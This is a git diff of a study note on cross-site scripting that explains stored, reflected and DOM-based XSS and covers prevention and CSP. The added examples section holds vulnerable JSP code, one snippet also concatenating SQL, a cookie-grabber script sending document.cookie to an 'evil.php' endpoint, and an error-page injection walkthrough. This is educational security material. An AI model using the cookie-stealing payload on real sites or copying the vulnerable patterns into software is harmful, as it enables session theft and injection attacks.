@@ -1,5 +1,5 @@
 ---
-title: Meow's CyberAttack - Cross Site Scripting
+title: Meow's CyberAttack - Application/Server Attacks - Scripts Injection - Cross Site Scripting
 # author: Grace JyL
 date: 2020-09-19 11:11:11 -0400
 description:
@@ -12,17 +12,51 @@ toc: true
 # image: /assets/img/sample/devices-mockup.png
 ---
 
-[toc]
+- [Meow's CyberAttack - Cross Site Scripting 跨站脚本](#meows-cyberattack---cross-site-scripting-跨站脚本)
+  - [XSS attacks](#xss-attacks)
+    - [XSS Attack Consequences](#xss-attack-consequences)
+  - [XSS Attacks Type](#xss-attacks-type)
+    - [Stored XSS Attacks](#stored-xss-attacks)
+    - [Reflected XSS Attacks](#reflected-xss-attacks)
+    - [DOM Based XSS](#dom-based-xss)
+  - [what XSS is](#what-xss-is)
+    - [Alternate XSS Syntax](#alternate-xss-syntax)
+    - [what you can do with it](#what-you-can-do-with-it)
+    - [How to Determine Vulnerable](#how-to-determine-vulnerable)
+  - [XSS Attack Example](#xss-attack-example)
+    - [Example: Reflected XSS](#example-reflected-xss)
+    - [Example: Stored XSS](#example-stored-xss)
+    - [Example: Cookie Grabber](#example-cookie-grabber)
+    - [Error Page Example](#error-page-example)
+  - [XSS Attack Prevention](#xss-attack-prevention)
+    - [Countermeasures](#countermeasures)
+    - [Input handling contexts](#input-handling-contexts)
+    - [Inbound/outbound input handling](#inboundoutbound-input-handling)
+    - [Encoding](#encoding)
+    - [Validation](#validation)
+    - [Content Security Policy (CSP)](#content-security-policy-csp)
+      - [How to enable CSP](#how-to-enable-csp)
+      - [Syntax of CSP](#syntax-of-csp)
+
+
+
+Ref:
+- [Stored & Reflected XSS and Testing with OWASP ZAP](https://www.youtube.com/watch?v=u12HB_WjmQE&ab_channel=DominicBatstone)
+- [Cross-Site Scripting Explained - Part 2: DOM-Based XSS](https://www.youtube.com/watch?v=UFlF3F-XOG4&ab_channel=webpwnized)
+- [Excess XSS](https://excess-xss.com/)
+
+Book: S+ 7th ch9
 
 ---
 
 # Meow's CyberAttack - Cross Site Scripting 跨站脚本
 
+---
 
-![Pasted Graphic](https://i.imgur.com/9VHZkSZ.png)
+## XSS attacks
 
 
-## Part One: Overview
+- Cross-Site Scripting (XSS) attacks
 
 - web application vulnerability
   - 是代码注入的一种。
@@ -30,8 +64,10 @@ toc: true
 - the basics of this attack revolve around website design, dynamic content, and invalidated input data.
 
 
+![Pasted Graphic](https://i.imgur.com/9VHZkSZ.png)
 
-### Cross-Site Scripting (XSS) attacks occur when:
+
+Cross-Site Scripting (XSS) attacks occur when:
 
 - `Data enters a Web application through an untrusted source` (web request.etc)
   - attacker take advantage of scripting and have it perform something other than the intended response.
@@ -127,7 +163,7 @@ XSS attacks can vary by application and by browser and can range from nuisance t
 ---
 
 
-## Part Two: XSS Attacks
+## XSS Attacks Type
 
 Different XSS Attacks
 - `Stored` vs. `Reflected` XSS
@@ -327,10 +363,137 @@ Recognize URL indicator of an XSS attempt:
 - Nessus, Nikto, and some other available tools can help scan a website for these flaws, but can only scratch the surface.
 - If one part of a website is vulnerable, there is a high likelihood that there are other problems as well.
 
+---
+
+## XSS Attack Example
+
+Cross-site scripting attacks may occur anywhere
+
+- where users are allowed to post unregulated material to a trusted website for the consumption of other valid users.
+
+- The most common example can be found in bulletin-board websites which provide web based mailing list-style functionality.
+
+### Example: Reflected XSS
+
+- The following JSP code <font color=LightSlateBlue> segment reads an employee ID, eid, from an HTTP request and displays it to the user. </font>
+
+  ```jsp
+  <% String eid = request.getParameter("eid"); %>
+  Employee ID: <%= eid %>
+  ```
+
+- The code in this example operates correctly if `eid` contains only standard alphanumeric text.
+
+- <font color=OrangeRed> If eid has a value that includes meta-characters or source code </font>
+  - then the code will be executed by the web browser as it displays the HTTP response.
+
+- attacker will create the malicious `URL`, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL.
+
+- `When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers`.
+
+- This mechanism of exploiting vulnerable web applications is known as <font color=OrangeRed> Reflected XSS </font>.
+
+
+### Example: Stored XSS
+
+- The following JSP code <font color=LightSlateBlue> segment queries a database for an employee with a given ID and prints the corresponding employee’s name </font>.
+
+  ```jsp
+  <%...
+    Statement stmt = conn.createStatement();
+    ResultSet rs = stmt.executeQuery("select * from emp where id="+ eid );
+    if (rs != null) {
+      rs.next();
+      String name = rs.getString("name");
+  %>
+  Employee Name: <%= name %>
+  ```
+
+- code functions correctly when the values of name are well-behaved,
+
+- this code can appear less dangerous because `the value of name is read from a database`
+  - contents are apparently managed by the application.
+
+- However, if `the value of name originates from user-supplied data`, then the database can be a conduit for malicious content.
+  - Malicious user stor malicious input in database
+
+- Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user’s web browser.
+
+- This type of exploit, known as <font color=OrangeRed> Stored XSS </font>
+  - particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users.
+
+- XSS got its start in this form with websites that offered a “guestbook” to visitors.
+  - Attackers would include JavaScript in their guestbook entries
+  - and all subsequent visitors to the guestbook page would execute the malicious code.
+
+
+
+As the examples demonstrate, XSS vulnerabilities are caused by `code that includes unvalidated data in an HTTP response`. There are `three vectors` by which an XSS attack can reach a victim:
+
+- As in Example 1, <font color=OrangeRed> data is read directly from the HTTP request and reflected back in the HTTP response </font>.
+  - Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser.
+  - The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims.
+  - URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site.
+  - After the site reflects the attacker’s content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user’s machine to the attacker or perform other nefarious activities.
+
+- As in Example 2, <font color=OrangeRed> the application stores dangerous data in a database or other trusted data store </font>. The dangerous data is subsequently read back into the application and included in dynamic content.
+  - Stored XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content.
+  - From an attacker’s perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users.
+  - Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker.
+  - If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.
+
+- A source outside the application <font color=OrangeRed> stores dangerous data in a database or other data store, and the dangerous data is subsequently read back </font> into the application as trusted data and included in dynamic content.
+
+
+### Example: Cookie Grabber
+
+- If the application doesn’t validate the input data
+
+- the attacker can steal a cookie from an authenticated user.
+
+- All the attacker has to do is to place the following code in any posted input (ie: message boards, private messages, user profiles):
+
+- The code will pass an escaped content of the cookie (according to RFC, <font color=LightSlateBlue> content must be escaped before sending it via HTTP protocol with GET method </font>) to the `evil.php script` in “`cakemonster`” variable.
+
+- The attacker then checks the results of their `evil.php script` and use it.
+  - a cookie grabber script will usually write the cookie to a file
+
+```php
+<SCRIPT type="text/javascript">
+var adr = '../evil.php?cakemonster=' + escape(document.cookie);
+</SCRIPT>
+```
+
+### Error Page Example
+
+- an error page, handling requests for a non existing pages, a classic 404 error page.
+
+- may use the code to inform user about what specific page is missing:
+
+```html
+<html>
+	<body>
+		<? php
+		print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
+		?>
+	</body>
+</html>
+```
+
+1. try: 
+   - `http://testsite.test/file_which_not_exist` 
+2. In response we get: 
+   - `Not found: /file_which_not_exist`
+3. force the error page to include our code: 
+   - `http://testsite.test/<script>alert("TEST");</script> `
+4. The result is: 
+   - `Not found: / (but with JavaScript code <script>alert("TEST");</script>)`
+5. We have successfully injected the code, may use this to steal user’s session cookie.
+
 
 ---
 
-## Part Three: Preventing XSS
+## XSS Attack Prevention
 
 
 ### Countermeasures
@@ -709,22 +872,3 @@ Status of CSP
 - It is being implemented by browser vendors, but parts of it are still browser-specific.
 - In particular, the HTTP header to use can differ between browsers.
 - Before using CSP today, consult the documentation of the browsers that you intend to support.
-
-
----
-
-
-Ref:
-- [Stored & Reflected XSS and Testing with OWASP ZAP](https://www.youtube.com/watch?v=u12HB_WjmQE&ab_channel=DominicBatstone)
-- [Cross-Site Scripting Explained - Part 2: DOM-Based XSS](https://www.youtube.com/watch?v=UFlF3F-XOG4&ab_channel=webpwnized)
-- [Excess XSS](https://excess-xss.com/)
-
-
-
-
-
-
-
-
-
-.
